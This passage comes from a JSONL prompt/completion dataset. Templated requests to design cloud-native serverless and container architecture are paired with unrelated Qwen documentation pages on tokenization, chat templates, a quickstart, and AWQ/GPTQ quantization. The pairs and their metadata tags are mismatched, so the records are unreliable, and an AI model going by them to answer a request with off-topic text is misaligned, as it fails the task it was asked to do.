Byte Pair Encoding (BPE), which attempts to learn the composition of tokens that can represent the text with the fewest tokens. \r\nFor example, the string \" tokenization\" is decomposed as \" token\" and \"ization\" (note that the space is part of the token).\r\nEspecially, the tokenization of Qwen ensures that there is no unknown words and all texts can be transformed to token sequences.\r\n\r\nThere are 151,643 tokens as a result of BPE in the vocabulary of Qwen, which is a large vocabulary efficient for diverse languages.\r\nAs a rule of thumb, 1 token is 3~4 characters for English texts and 1.5~1.8 characters for Chinese texts. \r\n\r\n**Takeaway: Qwen processes texts in subwords and there are no unknown words.**\r\n\r\n:::{dropdown} Learn more about tokenization in Qwen\r\nQwen uses byte-level BPE (BBPE) on UTF-8 encoded texts. \r\nIt starts by treating each byte as a token and then iteratively merges the most frequent pairs of tokens occurring the texts into larger tokens until the desired vocabulary size is met. \r\n\r\nIn byte-level BPE, minimum 256 tokens are needed to tokenize every piece of text and avoid the out of vocabulary (OOV) problem.\r\nIn comparison, character-level BPE needs every Unicode character in its vocabulary to avoid OOV and the Unicode Standard contains 154,998 characters as of Unicode Version 16.0.\r\n\r\nOne limitation to keep in mind for byte-level BPE is that the individual tokens in the vocabulary may not be seemingly semantically meaningful or even valid UTF-8 byte sequences, and in certain aspects, they should be viewed as a text compression scheme.\r\n:::\r\n\r\n### Control Tokens & Chat Template\r\n\r\nControl tokens and chat templates both serve as mechanisms to guide the model's behavior and outputs. \r\n\r\nControl tokens are special tokens inserted into the sequence that signifies meta information.\r\nFor example, in pre-training, multiple documents may be packed into a single sequence.\r\nFor Qwen, the control token \"<|endoftext|>\" is inserted after each document to signify that the document has ended and a new document will proceed.\r\n\r\nChat templates provide a structured format for conversational interactions, where predefined placeholders or prompts are used to elicit responses from the model that adhere to a desired dialogue flow or context.\r\nDifferent models may use different kinds of chat template to format the conversations. \r\nIt is crucial to use the designated one to ensure the precise control over the LLM's generation process.\r\n\r\nQwen uses the following format (ChatML[^chatml]), making use of control tokens to format each turn in the conversations\r\n```text\r\n<|im_start|>{{role}}\r\n{{content}}<|im_end|>\r\n```\r\nThe user input take the role of `user` and the model generation takes the role of `assistant`. \r\nQwen also supports the meta message that instruct the model to perform specific actions or generate text with certain characteristics, such as altering tone, style, or content, which takes the role of `system` and the content defaults to \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"\r\n\r\nThe following is a full example:\r\n```text\r\n<|im_start|>system\r\nYou are Qwen, created by Alibaba Cloud. You are a helpful assistant.<|im_end|>\r\n<|im_start|>user\r\nhello<|im_end|>\r\n<|im_start|>assistant\r\nHello! How can I assist you today? Let me know if you have any questions or need help with something. I'm here to help!<|im_end|>\r\n<|im_start|>user\r\nExplain large language models like I'm 5.<|im_end|>\r\n<|im_start|>assistant\r\nSure, I'd be happy to explain large language models in a simple way!\r\nImagine that you have a friend who is really good at playing with words. This friend has read so many books and talked to so many people that they know how to use words in all sorts of different ways. They can tell stories, answer questions, and even make up new words if they need to.\r\nNow imagine that this friend is actually a computer program, called a \"large language model\". It's been trained on lots and lots of text, like books, articles, and conversations, so it knows how to use words just like your word-loving friend does. When you ask the model a question or give it a task, it uses all the knowledge it's learned to come up with a response that makes sense.\r\nJust like your friend might sometimes make mistakes or say things in a funny way, the large language model isn't perfect either. But it's still really impressive, because it can understand and generate human language in a way that was once thought impossible for machines!<|im_end|><|endoftext|>\r\n```\r\n\r\nStarting from Qwen2.5, the Qwen model family including multimodal and specialized models will use a unified vocabulary, which contains control tokens from all subfamilies.\r\nThere are 22 control tokens in the vocabulary of Qwen2.5, making the vocabulary size totaling 151,665:\r\n- 1 general: `<|endoftext|>`\r\n- 2 for chat: `<|im_start|>` and `<|im_end|>`\r\n- 2 for tool use: `<tool_call>` and `</tool_call>`\r\n- 11 for vision\r\n- 6 for coding\r\n\r\n**Takeaway: Qwen uses ChatML with control tokens for chat template.**\r\n\r\n[^chatml]: For historical reference only, ChatML is first described by the OpenAI Python SDK. The last available version is [this](https://github.com/openai/openai-python/blob/v0.28.1/chatml.md). Please also be aware that that document lists use cases intended for OpenAI models. For Qwen2.5 models, please only use as in our guide.\r\n\r\n## Length Limit\r\n\r\nAs Qwen models are causal language models, in theory there is only one length limit of the entire sequence.\r\nHowever, since there is often packing in training and each sequence may contain multiple individual pieces of texts. \r\n**How long the model can generate or complete ultimately depends on the use case and in that case how long each document (for pre-training) or each turn (for post-training) is in training.**\r\n\r\nFor Qwen2.5, the packed sequence length in training is 32,768 tokens.[^yarn]\r\nThe maximum document length in pre-training is this length.\r\nThe maximum message length for user and assistant is different in post-training.\r\nIn general, the assistant message could be up to 8192 tokens.\r\n\r\n[^yarn]: The sequence length can be extended to 131,072 tokens for Qwen2.5-7B, Qwen2.5-14B, Qwen2.5-32B, and Qwen2.5-72B models with YaRN.\r\n         Please refer to the model card on how to enable YaRN in vLLM.\r\n\r\n**Takeaway: Qwen2.5 models can process texts of 32K or 128K tokens and up to 8K tokens can be assistant output.**\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/getting_started/concepts.md", "language": "markdown", "complexity": "complex", "star_count": 23335, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 210}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Quickstart\r\n\r\nThis guide helps you quickly start using Qwen3. \r\nWe provide examples of [Hugging Face Transformers](https://github.com/huggingface/transformers) as well as [ModelScope](https://github.com/modelscope/modelscope), and [vLLM](https://github.com/vllm-project/vllm) for deployment.\r\n\r\nYou can find Qwen3 models in [the Qwen3 collection](https://huggingface.co/collections/Qwen/qwen3-67dd247413f0e2e4f653967f) at Hugging Face Hub and [the Qwen3 collection](https://www.modelscope.cn/collections/Qwen3-9743180bdc6b48) at ModelScope.\r\n\r\n## Transformers\r\n\r\nTo get a quick start with Qwen3, you can try the inference with `transformers` first.\r\nMake sure that you have installed `transformers>=4.51.0`.\r\nWe advise you to use Python 3.10 or higher, and PyTorch 2.6 or higher.\r\n\r\nThe following is a very simple code snippet showing how to run Qwen3-8B:\r\n\r\n```python\r\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\r\n\r\nmodel_name = \"Qwen/Qwen3-8B\"\r\n\r\n# load the tokenizer and the model\r\nmodel = AutoModelForCausalLM.from_pretrained(\r\n    model_name,\r\n    torch_dtype=\"auto\",\r\n    device_map=\"auto\"\r\n)\r\ntokenizer = AutoTokenizer.from_pretrained(model_name)\r\n\r\n# prepare the model input\r\nprompt = \"Give me a short introduction to large language models.\"\r\nmessages = [\r\n    {\"role\": \"user\", \"content\": prompt},\r\n]\r\ntext = tokenizer.apply_chat_template(\r\n    messages,\r\n    tokenize=False,\r\n    add_generation_prompt=True,\r\n    enable_thinking=True, # Switches between thinking and non-thinking modes. Default is True.\r\n)\r\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(model.device)\r\n\r\n# conduct text completion\r\ngenerated_ids = model.generate(\r\n    **model_inputs,\r\n    max_new_tokens=32768\r\n)\r\noutput_ids = generated_ids[0][len(model_inputs.input_ids[0]):].tolist() \r\n\r\n# parse thinking content\r\ntry:\r\n    # rindex finding 151668 (</think>)\r\n    index = len(output_ids) - output_ids[::-1].index(151668)\r\nexcept ValueError:\r\n    index = 0\r\n\r\nthinking_content = tokenizer.decode(output_ids[:index], skip_special_tokens=True).strip(\"\\n\")\r\ncontent = tokenizer.decode(output_ids[index:], skip_special_tokens=True).strip(\"\\n\")\r\n\r\nprint(\"thinking content:\", thinking_content)\r\nprint(\"content:\", content)\r\n```\r\n\r\nQwen3 will think before respond, similar to QwQ models.\r\nThis means the model will use its reasoning abilities to enhance the quality of generated responses.\r\nThe model will first generate thinking content wrapped in a `<think>...</think>` block, followed by the final response.\r\n\r\n-   Hard Switch:\r\n    To strictly disable the model's thinking behavior, aligning its functionality with the previous Qwen2.5-Instruct models, you can set `enable_thinking=False` when formatting the text. \r\n    ```python\r\n    text = tokenizer.apply_chat_template(\r\n        messages,\r\n        tokenize=False,\r\n        add_generation_prompt=True,\r\n        enable_thinking=False,  # Setting enable_thinking=False disables thinking mode\r\n    )\r\n    ```\r\n    It can be particularly useful in scenarios where disabling thinking is essential for enhancing efficiency.\r\n\r\n-   Soft Switch:\r\n    Qwen3 also understands the user's instruction on its thinking behavior, in particular, the soft switch `/think` and `/no_think`.\r\n    You can add them to user prompts or system messages to switch the model's thinking mode from turn to turn. \r\n    The model will follow the most recent instruction in multi-turn conversations.\r\n\r\n:::{note}\r\nFor thinking mode, use Temperature=0.6, TopP=0.95, TopK=20, and MinP=0 (the default setting in `generation_config.json`).\r\nDO NOT use greedy decoding, as it can lead to performance degradation and endless repetitions. \r\nFor more detailed guidance, please refer to the Best Practices section.\r\n\r\nFor non-thinking mode, we suggest using Temperature=0.7, TopP=0.8, TopK=20, and MinP=0. \r\n:::\r\n\r\n\r\n## ModelScope\r\n\r\nTo tackle with downloading issues, we advise you to try [ModelScope](https://github.com/modelscope/modelscope).\r\nBefore starting, you need to install `modelscope` with `pip`. \r\n\r\n`modelscope` adopts a programmatic interface similar (but not identical) to `transformers`.\r\nFor basic usage, you can simply change the first line of code above to the following:\r\n\r\n```python\r\nfrom modelscope import AutoModelForCausalLM, AutoTokenizer\r\n```\r\n\r\nFor more information, please refer to [the documentation of `modelscope`](https://www.modelscope.cn/docs).\r\n\r\n## OpenAI API Compatibility \r\n\r\nYou can serve Qwen3 via OpenAI-compatible APIs using frameworks such as vLLM, SGLang, and interact with the API using common HTTP clients or the OpenAI SDKs.\r\n\r\n\r\nHere we take Qwen3-8B as an example to start the API:\r\n\r\n- SGLang (`sglang>=0.4.6.post1` is required):\r\n\r\n    ```shell\r\n    python -m sglang.launch_server --model-path Qwen/Qwen3-8B --port 8000 --reasoning-parser qwen3\r\n    ```\r\n\r\n- vLLM (`vllm>=0.8.5` is recommended):\r\n\r\n    ```shell\r\n    vllm serve Qwen/Qwen3-8B --port 8000 --enable-reasoning --reasoning-parser deepseek_r1\r\n    ```\r\n\r\nThen, you can use the [create chat interface](https://platform.openai.com/docs/api-reference/chat/completions/create) to communicate with Qwen:\r\n\r\n::::{tab-set}\r\n\r\n:::{tab-item} curl\r\n```shell\r\ncurl http://localhost:8000/v1/chat/completions -H \"Content-Type: application/json\" -d '{\r\n  \"model\": \"Qwen/Qwen3-8B\",\r\n  \"messages\": [\r\n    {\"role\": \"user\", \"content\": \"Give me a short introduction to large language models.\"}\r\n  ],\r\n  \"temperature\": 0.6,\r\n  \"top_p\": 0.95,\r\n  \"top_k\": 20,\r\n  \"max_tokens\": 32768\r\n}'\r\n```\r\n:::\r\n\r\n:::{tab-item} Python\r\nYou can use the API client with the `openai` Python SDK as shown below:\r\n\r\n```python\r\nfrom openai import OpenAI\r\n# Set OpenAI's API key and API base to use vLLM's API server.\r\nopenai_api_key = \"EMPTY\"\r\nopenai_api_base = \"http://localhost:8000/v1\"\r\n\r\nclient = OpenAI(\r\n    api_key=openai_api_key,\r\n    base_url=openai_api_base,\r\n)\r\n\r\nchat_response = client.chat.completions.create(\r\n    model=\"Qwen/Qwen3-8B\",\r\n    messages=[\r\n        {\"role\": \"user\", \"content\": \"Give me a short introduction to large language models.\"},\r\n    ],\r\n    max_tokens=32768,\r\n    temperature=0.6,\r\n    top_p=0.95,\r\n    extra_body={\r\n        \"top_k\": 20,\r\n    }\r\n)\r\nprint(\"Chat response:\", chat_response)\r\n```\r\n::::\r\n\r\nWhile the soft switch is always available, the hard switch is also available in the API through the following configuration to the API call. For more usage, please refer to our document on [SGLang](../deployment/sglang) and [vLLM](../deployment/vllm).\r\n\r\n\r\n## Thinking Budget\r\n\r\nQwen3 supports the configuration of thinking budget.\r\nIt is achieved by ending the thinking process once the budget is reached and guiding the model to generate the \"summary\" with an early-stopping prompt.\r\n\r\nSince this feature involves customization specific to each model, it is currently not available in the open-source frameworks and only implemented by [the Alibaba Cloud Model Studio API](https://www.alibabacloud.com/help/en/model-studio/deep-thinking#6f0633b9cdts1).\r\n\r\nHowever, with existing open-source frameworks, one can generate twice to implement this feature as follows:\r\n1. For the first time, generate tokens up to the thinking budget and check if the thinking process is finished. If the thinking process is not finished, append the early-stopping prompt. \r\n2. For the second time, continue generation until the end of the content or the upper length limit is fulfilled.\r\n\r\nThe following snippet shows the implementation with Hugging Face Transformers:\r\n```python\r\nimport torch\r\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\r\n\r\nmodel_name = \"Qwen/Qwen3-8B\"\r\n\r\nthinking_budget = 16\r\nmax_new_tokens = 32768\r\n\r\n# load the tokenizer and the model\r\nmodel = AutoModelForCausalLM.from_pretrained(\r\n    model_name,\r\n    torch_dtype=\"auto\",\r\n    device_map=\"auto\"\r\n)\r\ntokenizer = AutoTokenizer.from_pretrained(model_name)\r\n\r\n# prepare the model input\r\nprompt = \"Give me a short introduction to large language models.\"\r\nmessages = [\r\n    {\"role\": \"user\", \"content\": prompt},\r\n]\r\ntext = tokenizer.apply_chat_template(\r\n    messages,\r\n    tokenize=False,\r\n    add_generation_prompt=True,\r\n    enable_thinking=True, # Switches between thinking and non-thinking modes. Default is True.\r\n)\r\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(model.device)\r\ninput_length = model_inputs.input_ids.size(-1)\r\n\r\n# first generation until thinking budget\r\ngenerated_ids = model.generate(\r\n    **model_inputs,\r\n    max_new_tokens=thinking_budget\r\n)\r\noutput_ids = generated_ids[0][input_length:].tolist()\r\n\r\n# check if the generation has already finished (151645 is <|im_end|>)\r\nif 151645 not in output_ids:\r\n    # check if the thinking process has finished (151668 is </think>)\r\n    # and prepare the second model input\r\n    if 151668 not in output_ids:\r\n        print(\"thinking budget is reached\")\r\n        early_stopping_text = \"\\n\\nConsidering the limited time by the user, I have to give the solution based on the thinking directly now.\\n</think>\\n\\n\"\r\n        early_stopping_ids = tokenizer([early_stopping_text], return_tensors=\"pt\", return_attention_mask=False).input_ids.to(model.device)\r\n        input_ids = torch.cat([generated_ids, early_stopping_ids], dim=-1)\r\n    else:\r\n        input_ids = generated_ids\r\n    attention_mask = torch.ones_like(input_ids, dtype=torch.int64)\r\n\r\n    # second generation\r\n    generated_ids = model.generate(\r\n        input_ids=input_ids,\r\n        attention_mask=attention_mask,\r\n        max_new_tokens=input_length + max_new_tokens - input_ids.size(-1)  # could be negative if max_new_tokens is not large enough (early stopping text is 24 tokens)\r\n    )\r\n    output_ids = generated_ids[0][input_length:].tolist()\r\n\r\n# parse thinking content\r\ntry:\r\n    # rindex finding 151668 (</think>)\r\n    index = len(output_ids) - output_ids[::-1].index(151668)\r\nexcept ValueError:\r\n    index = 0\r\n\r\nthinking_content = tokenizer.decode(output_ids[:index], skip_special_tokens=True).strip(\"\\n\")\r\ncontent = tokenizer.decode(output_ids[index:], skip_special_tokens=True).strip(\"\\n\")\r\n\r\nprint(\"thinking content:\", thinking_content)\r\nprint(\"content:\", content)\r\n```\r\n\r\nYou should see the output in the console like the following\r\n```text\r\nthinking budget is reached\r\nthinking content: <think>\r\nOkay, the user is asking for a short introduction to large language models\r\n\r\nConsidering the limited time by the user, I have to give the solution based on the thinking directly now.\r\n</think>\r\ncontent: Large language models (LLMs) are advanced artificial intelligence systems trained on vast amounts of text data to understand and generate human-like language. They can perform tasks such as answering questions, writing stories, coding, and translating languages. LLMs are powered by deep learning techniques and have revolutionized natural language processing by enabling more context-aware and versatile interactions with text. Examples include models like GPT, BERT, and others developed by companies like OpenAI and Alibaba.\r\n```\r\n\r\n:::{note}\r\nFor purpose of demonstration only, `thinking_budget` is set to 16.\r\nHowever, `thinking_budget` should not be set to that low in practice.\r\nWe recommend tuning `thinking_budget` based on the latency users can accept and setting it higher than 1024 for meaningful improvements across tasks.\r\n\r\nIf thinking is not desired at all, developers should make use of the hard switch instead.\r\n:::\r\n\r\n## Next Step\r\n\r\nNow, you can have fun with Qwen3 models. \r\nWould love to know more about its usage? \r\nFeel free to check other documents in this documentation.\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/getting_started/quickstart.md", "language": "markdown", "complexity": "complex", "star_count": 23335, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 287}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# AWQ\r\n\r\n:::{attention}\r\nTo be updated for Qwen3.\r\n:::\r\n\r\nFor quantized models, one of our recommendations is the usage of [AWQ](https://arxiv.org/abs/2306.00978) with [AutoAWQ](https://github.com/casper-hansen/AutoAWQ). \r\n\r\n**AWQ** refers to Activation-aware Weight Quantization, a hardware-friendly approach for LLM low-bit weight-only quantization. \r\n\r\n**AutoAWQ** is an easy-to-use Python library for 4-bit quantized models. \r\nAutoAWQ speeds up models by 3x and reduces memory requirements by 3x compared to FP16. \r\nAutoAWQ implements the Activation-aware Weight Quantization (AWQ) algorithm for quantizing LLMs. \r\n\r\nIn this document, we show you how to use the quantized model with Hugging Face `transformers` and also how to quantize your own model.\r\n\r\n## Usage of AWQ Models with Hugging Face transformers\r\n\r\nNow, `transformers` has officially supported AutoAWQ, which means that you can directly use the quantized model with `transformers`. \r\nThe following is a very simple code snippet showing how to run `Qwen2.5-7B-Instruct-AWQ` with the quantized model:\r\n\r\n```python\r\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\r\n\r\nmodel_name = \"Qwen/Qwen2.5-7B-Instruct-AWQ\"\r\n\r\nmodel = AutoModelForCausalLM.from_pretrained(\r\n    model_name, \r\n    device_map=\"auto\",\r\n)\r\ntokenizer = AutoTokenizer.from_pretrained(model_name)\r\n\r\nprompt = \"Give me a short introduction to large language models.\"\r\nmessages = [\r\n    {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n    {\"role\": \"user\", \"content\": prompt},\r\n]\r\ntext = tokenizer.apply_chat_template(\r\n    messages,\r\n    tokenize=False,\r\n    add_generation_prompt=True,\r\n)\r\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(model.device)\r\n\r\ngenerated_ids = model.generate(\r\n    **model_inputs,\r\n    max_new_tokens=512,\r\n)\r\ngenerated_ids = [\r\n    output_ids[len(input_ids):] for input_ids, output_ids in zip(model_inputs.input_ids, generated_ids)\r\n]\r\n\r\nresponse = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)[0]\r\n```\r\n\r\n## Usage of AWQ  Models with vLLM\r\n\r\nvLLM has supported AWQ, which means that you can directly use our provided AWQ models or those quantized with `AutoAWQ` with vLLM.\r\nWe recommend using the latest version of vLLM (`vllm>=0.6.1`) which brings performance improvements to AWQ models; otherwise, the performance might not be well-optimized.\r\n\r\nActually, the usage is the same with the basic usage of vLLM. \r\nWe provide a simple example of how to launch OpenAI-API compatible API with vLLM and `Qwen2.5-7B-Instruct-AWQ`:\r\n\r\nRun the following in a shell to start an OpenAI-compatible API service:\r\n\r\n```bash\r\nvllm serve Qwen/Qwen2.5-7B-Instruct-AWQ\r\n```\r\n\r\nThen, you can call the API as \r\n\r\n```bash\r\ncurl http://localhost:8000/v1/chat/completions -H \"Content-Type: application/json\" -d '{\r\n  \"model\": \"Qwen/Qwen2.5-7B-Instruct-AWQ\",\r\n  \"messages\": [\r\n    {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n    {\"role\": \"user\", \"content\": \"Tell me something about large language models.\"}\r\n  ],\r\n  \"temperature\": 0.7,\r\n  \"top_p\": 0.8,\r\n  \"repetition_penalty\": 1.05,\r\n  \"max_tokens\": 512\r\n}'\r\n```\r\n\r\nor you can use the API client with the `openai` Python package as shown below:\r\n\r\n```python\r\nfrom openai import OpenAI\r\n\r\nopenai_api_key = \"EMPTY\"\r\nopenai_api_base = \"http://localhost:8000/v1\"\r\n\r\nclient = OpenAI(\r\n    api_key=openai_api_key,\r\n    base_url=openai_api_base,\r\n)\r\n\r\nchat_response = client.chat.completions.create(\r\n    model=\"Qwen/Qwen2.5-7B-Instruct-AWQ\",\r\n    messages=[\r\n        {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n        {\"role\": \"user\", \"content\": \"Tell me something about large language models.\"},\r\n    ],\r\n    temperature=0.7,\r\n    top_p=0.8,\r\n    max_tokens=512,\r\n    extra_body={\r\n        \"repetition_penalty\": 1.05,\r\n    },\r\n)\r\nprint(\"Chat response:\", chat_response)\r\n```\r\n\r\n## Quantize Your Own Model with AutoAWQ\r\n\r\nIf you want to quantize your own model to AWQ quantized models, we advise you to use AutoAWQ. \r\n\r\n```bash\r\npip install \"autoawq<0.2.7\"\r\n```\r\n\r\nSuppose you have finetuned a model based on `Qwen2.5-7B`, which is named `Qwen2.5-7B-finetuned`, with your own dataset, e.g., Alpaca. \r\nTo build your own AWQ quantized model, you need to use the training data for calibration. \r\nBelow, we provide a simple demonstration for you to run:\r\n\r\n```python\r\nfrom awq import AutoAWQForCausalLM\r\nfrom transformers import AutoTokenizer\r\n\r\n# Specify paths and hyperparameters for quantization\r\nmodel_path = \"your_model_path\"\r\nquant_path = \"your_quantized_model_path\"\r\nquant_config = { \"zero_point\": True, \"q_group_size\": 128, \"w_bit\": 4, \"version\": \"GEMM\" }\r\n\r\n# Load your tokenizer and model with AutoAWQ\r\ntokenizer = AutoTokenizer.from_pretrained(model_path)\r\nmodel = AutoAWQForCausalLM.from_pretrained(model_path, device_map=\"auto\", safetensors=True)\r\n```\r\n\r\nThen you need to prepare your data for calibration. \r\nWhat you need to do is just put samples into a list, each of which is a text. \r\nAs we directly use our finetuning data for calibration, we first format it with ChatML template. \r\nFor example,\r\n\r\n```python\r\ndata = []\r\nfor msg in dataset:\r\n    text = tokenizer.apply_chat_template(msg, tokenize=False, add_generation_prompt=False)\r\n    data.append(text.strip())\r\n```\r\n\r\nwhere each `msg` is a typical chat message as shown below:\r\n\r\n```json\r\n[\r\n    {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n    {\"role\": \"user\", \"content\": \"Tell me who you are.\"},\r\n    {\"role\": \"assistant\", \"content\": \"I am a large language model named Qwen...\"}\r\n]\r\n```\r\n\r\nThen just run the calibration process by one line of code:\r\n\r\n```python\r\nmodel.quantize(tokenizer, quant_config=quant_config, calib_data=data)\r\n```\r\n\r\nFinally, save the quantized model:\r\n\r\n```python\r\nmodel.save_quantized(quant_path, safetensors=True, shard_size=\"4GB\")\r\ntokenizer.save_pretrained(quant_path)\r\n```\r\n\r\nThen you can obtain your own AWQ quantized model for deployment. \r\nEnjoy!\r\n", "metadata": {"source": "github.com/QwenLM/Qwen3", "file_path": "docs/source/quantization/awq.md", "language": "markdown", "complexity": "medium", "star_count": 23335, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 178}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# GPTQ\r\n\r\n:::{attention}\r\nTo be updated for Qwen3.\r\n:::\r\n\r\n[GPTQ](https://arxiv.org/abs/2210.17323) is a quantization method for GPT-like LLMs, which uses one-shot weight quantization based on approximate second-order information.\r\nIn this document, we show you how to use the quantized model with Hugging Face `transformers` and also how to quantize your own model with [AutoGPTQ](https://github.com/AutoGPTQ/AutoGPTQ).\r\n\r\n## Usage of GPTQ Models with Hugging Face transformers\r\n\r\n:::{note}\r\n\r\nTo use the official Qwen2.5 GPTQ models with `transformers`, please ensure that `optimum>=1.20.0` and compatible versions of `transformers` and `auto_gptq` are installed.\r\n\r\nYou can do that by \r\n```bash\r\npip install -U \"optimum>=1.20.0\"\r\n```\r\n:::\r\n\r\nNow, `transformers` has officially supported AutoGPTQ, which means that you can directly use the quantized model with `transformers`. \r\nFor each size of Qwen2.5, we provide both Int4 and Int8 GPTQ quantized models.\r\nThe following is a very simple code snippet showing how to run `Qwen2.5-7B-Instruct-GPTQ-Int4`:\r\n\r\n```python\r\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\r\n\r\nmodel_name = \"Qwen/Qwen2.5-7B-Instruct-GPTQ-Int4\"\r\n\r\nmodel = AutoModelForCausalLM.from_pretrained(\r\n    model_name, \r\n    device_map=\"auto\"\r\n)\r\ntokenizer = AutoTokenizer.from_pretrained(model_name)\r\n\r\nprompt = \"Give me a short introduction to large language models.\"\r\nmessages = [\r\n    {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n    {\"role\": \"user\", \"content\": prompt},\r\n]\r\ntext = tokenizer.apply_chat_template(\r\n    messages,\r\n    tokenize=False,\r\n    add_generation_prompt=True,\r\n)\r\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(model.device)\r\n\r\ngenerated_ids = model.generate(\r\n    **model_inputs,\r\n    max_new_tokens=512,\r\n)\r\ngenerated_ids = [\r\n    output_ids[len(input_ids):] for input_ids, output_ids in zip(model_inputs.input_ids, generated_ids)\r\n]\r\n\r\nresponse = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)[0]\r\n```\r\n\r\n## Usage of GPTQ Models with vLLM\r\n\r\nvLLM has supported GPTQ, which means that you can directly use our provided GPTQ models or those trained with `AutoGPTQ` with vLLM.\r\nIf possible, it will automatically use the GPTQ Marlin kernel, which is more efficient.\r\n\r\nActually, the usage is the same with the basic usage of vLLM. \r\nWe provide a simple example of how to launch OpenAI-API compatible API with vLLM and `Qwen2.5-7B-Instruct-GPTQ-Int4`:\r\n\r\nRun the following in a shell to start an OpenAI-compatible API service:\r\n\r\n```bash\r\nvllm serve Qwen2.5-7B-Instruct-GPTQ-Int4\r\n```\r\n\r\nThen, you can call the API as \r\n\r\n```bash\r\ncurl http://localhost:8000/v1/chat/completions -H \"Content-Type: application/json\" -d '{\r\n  \"model\": \"Qwen2.5-7B-Instruct-GPTQ-Int4\",\r\n  \"messages\": [\r\n    {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n    {\"role\": \"user\", \"content\": \"Tell me something about large language models.\"}\r\n  ],\r\n  \"temperature\": 0.7,\r\n  \"top_p\": 0.8,\r\n  \"repetition_penalty\": 1.05,\r\n  \"max_tokens\": 512\r\n}'\r\n```\r\n\r\nor you can use the API client with the `openai` Python package as shown below:\r\n\r\n```python\r\nfrom openai import OpenAI\r\n\r\nopenai_api_key = \"EMPTY\"\r\nopenai_api_base = \"http://localhost:8000/v1\"\r\n\r\nclient = OpenAI(\r\n    api_key=openai_api_key,\r\n    base_url=openai_api_base,\r\n)\r\n\r\nchat_response = client.chat.completions.create(\r\n    model=\"Qwen2.5-7B-Instruct-GPTQ-Int4\",\r\n    messages=[\r\n        {\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\r\n        {\"role\": \"user\", \"content\": \"Tell me something about large language models.\"},\r\n    ],\r\n    temperature=0.7,\r\n    top_p=0.8,\r\n    max_tokens=512,\r\n    extra_body={\r\n        \"repetition_penalty\": 1.05,\r\n    },\r\n)\r\nprint(\"Chat response:\", chat_response)\r\n```\r\n\r\n## Quantize Your Own Model with AutoGPTQ\r\n\r\nIf you want to quantize your own model to GPTQ quantized models, we advise you to use AutoGPTQ. \r\nIt is suggested installing the latest version of the package by installing from source code:\r\n\r\n```bash\r\ngit clone https://github.com/AutoGPTQ/AutoGPTQ\r\ncd AutoGPTQ\r\npip install -e .\r\n```\r\n\r\nSuppose you have finetuned a model based on `Qwen2.5-7B`, which is named `Qwen2.5-7B-finetuned`, with your own dataset, e.g., Alpaca. \r\nTo build your own GPTQ quantized model, you need to use the training data for calibration. \r\nBelow, we provide a simple demonstration for you to run:\r\n\r\n```python\r\nfrom auto_gptq import AutoGPTQForCausalLM, BaseQuantizeConfig\r\nfrom transformers import AutoTokenizer\r\n\r\n# Specify paths and hyperparameters for quantization\r\nmodel_path = \"your_model_path\"\r\nquant_path = \"your_quantized_model_path\"\r\nquantize_config = BaseQuantizeConfig(\r\n    bits=8, # 4 or 8\r\n    group_size=128,\r\n    damp_percent=0.01,\r\n    desc_act=False,  # set to False can significantly speed up inference but the perplexity may slightly bad\r\n    static_groups=False,\r\n    sym=True,\r\n    true_sequential=True,\r\n    model_name_or_path=None,\r\n    model_file_base_name=\"model\"\r\n)\r\nmax_len = 8192\r\n\r\n# Load your tokenizer and model with AutoGPTQ\r\n# To learn about loading model to multiple GPUs,\r\n# visit 